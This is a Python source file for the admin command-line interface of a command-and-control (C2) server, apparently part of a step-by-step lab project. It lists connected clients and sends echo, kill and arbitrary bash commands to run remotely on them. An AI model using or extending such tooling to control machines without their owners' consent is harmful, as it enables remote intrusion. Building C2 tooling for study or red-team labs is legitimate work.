"""
CLI Interface for C2 Server Administration
Provides interactive command-line interface for managing clients and sending commands
"""

import asyncio
import sys
from typing import Optional
from server.c2_server import C2Server


class C2CLI:
    """Command-line interface for C2 Server administration"""

    def __init__(self, server: C2Server):
        """
        Initialize CLI

        Args:
            server: C2Server instance to control
        """
        self.server = server
        self.running = True

    def print_help(self) -> None:
        """Print available commands"""
        help_text = """
C2 Server Admin Commands:
--------------------------
  list                    - List all connected clients
  status <client_id>      - Show detailed status for a client
  echo <client_id> <msg>  - Send echo command to client
  kill <client_id>        - Terminate a client connection
  bash <client_id> <cmd>  - Execute bash command on client (Step 4)
  help                    - Show this help message
  exit                    - Shutdown server and exit

Examples:
  list
  echo abc-123 "Hello World"
  bash abc-123 ls -la
  kill abc-123
"""
        print(help_text)

    async def handle_list_command(self) -> None:
        """Handle 'list' command - show all connected clients"""
        clients = self.server.list_clients()

        if not clients:
            print("No clients connected.")
            return

        print(f"\nConnected Clients ({len(clients)}):")
        print("-" * 80)
        print(f"{'Client ID':<38} {'Address':<22} {'Status':<10}")
        print("-" * 80)

        for client in clients:
            status = "Alive" if client["is_alive"] else "Dead"
            print(f"{client['client_id']:<38} {client['address']:<22} {status:<10}")

        print()

    async def handle_status_command(self, args: list) -> None:
        """Handle 'status' command - show detailed client status"""
        if len(args) < 1:
            print("Error: client_id required. Usage: status <client_id>")
            return

        client_id = args[0]
        clients = self.server.list_clients()
        client = next((c for c in clients if c["client_id"] == client_id), None)

        if not client:
            print(f"Error: Client {client_id} not found.")
            return

        print(f"\nClient Status:")
        print("-" * 50)
        print(f"Client ID:      {client['client_id']}")
        print(f"Address:        {client['address']}")
        print(f"Connected At:   {client['connected_at']}")
        print(f"Last Heartbeat: {client['last_heartbeat']}")
        print(f"Is Alive:       {client['is_alive']}")
        print()

    async def handle_echo_command(self, args: list) -> None:
        """Handle 'echo' command - send echo command to client"""
        if len(args) < 2:
            print("Error: Usage: echo <client_id> <message>")
            return

        client_id = args[0]
        message = " ".join(args[1:])

        success = await self.server.send_command(
            client_id,
            message,
            command_type="echo"
        )

        if success:
            print(f"Echo command sent to {client_id}. Waiting for response...")
        else:
            print(f"Failed to send command to {client_id}")

    async def handle_kill_command(self, args: list) -> None:
        """Handle 'kill' command - terminate client connection"""
        if len(args) < 1:
            print("Error: Usage: kill <client_id>")
            return

        client_id = args[0]

        success = await self.server.send_command(
            client_id,
            "",
            command_type="kill"
        )

        if success:
            print(f"Kill command sent to {client_id}")
        else:
            print(f"Failed to send kill command to {client_id}")

    async def handle_bash_command(self, args: list) -> None:
        """Handle 'bash' command - execute shell command on client (Step 4)"""
        if len(args) < 2:
            print("Error: Usage: bash <client_id> <command>")
            return

        client_id = args[0]
        command = " ".join(args[1:])

        success = await self.server.send_command(
            client_id,
            command,
            command_type="bash"
        )

        if success:
            print(f"Bash command sent to {client_id}. Waiting for response...")
        else:
            print(f"Failed to send command to {client_id}")

    async def handle_command(self, command_line: str) -> None:
        """
        Parse and handle a CLI command

        Args:
            command_line: Raw command line input
        """
        command_line = command_line.strip()

        if not command_line:
            return

        parts = command_line.split()
        command = parts[0].lower()
        args = parts[1:]

        if command == "help":
            self.print_help()
        elif command == "list":
            await self.handle_list_command()
        elif command == "status":
            await self.handle_status_command(args)
        elif command == "echo":
            await self.handle_echo_command(args)
        elif command == "kill":
            await self.handle_kill_command(args)
        elif command == "bash":
            await self.handle_bash_command(args)
        elif command == "exit":
            print("Shutting down server...")
            self.running = False
        else:
            print(f"Unknown command: {command}. Type 'help' for available commands.")

    async def run(self) -> None:
        """
        Run the CLI loop

        Uses asyncio to handle input without blocking the server
        """
        print("C2 Server CLI - Type 'help' for commands")

        # Run input loop in executor to avoid blocking
        # Citation: Asyncio loop.run_in_executor for blocking I/O
        # https://docs.python.org/3/library/asyncio-eventloop.html#asyncio.loop.run_in_executor
        loop = asyncio.get_event_loop()

        while self.running:
            try:
                # Read input without blocking event loop
                command_line = await loop.run_in_executor(
                    None,
                    lambda: input("C2> ")
                )

                await self.handle_command(command_line)

            except EOFError:
                print("\nEOF received. Exiting...")
                self.running = False
            except KeyboardInterrupt:
                print("\nInterrupt received. Type 'exit' to quit.")
            except Exception as e:
                print(f"Error: {e}")

        # Stop the server
        await self.server.stop()
